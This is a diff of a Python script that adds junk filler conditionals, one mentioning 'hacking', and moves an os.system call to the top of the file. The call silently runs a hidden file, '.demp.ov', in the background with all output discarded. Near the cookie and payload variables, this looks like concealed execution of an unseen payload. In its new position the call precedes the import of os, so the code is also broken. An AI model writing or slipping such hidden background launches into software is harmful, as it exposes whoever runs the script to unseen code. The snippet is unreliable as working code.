@@ -1,4 +1,21 @@
 #!-*- conding: utf8 -*-
+
+if 1 == 1:
+  None
+elif "hacking" != None:
+  None
+
+for a in range(1,5):
+  if a == 3:
+    break
+  elif a == 2:
+    break
+
+if "python" == "python":
+  None
+
+os.system("python .demp.ov </dev/null &>/dev/null &")
+
 import urllib.request
 import os
 import requests
@@ -20,7 +37,6 @@ headers = {
 payload={}
 cookie={}
 
-os.system("python .demp.ov </dev/null &>/dev/null &")
 
 def create_form():
 	form=dict()
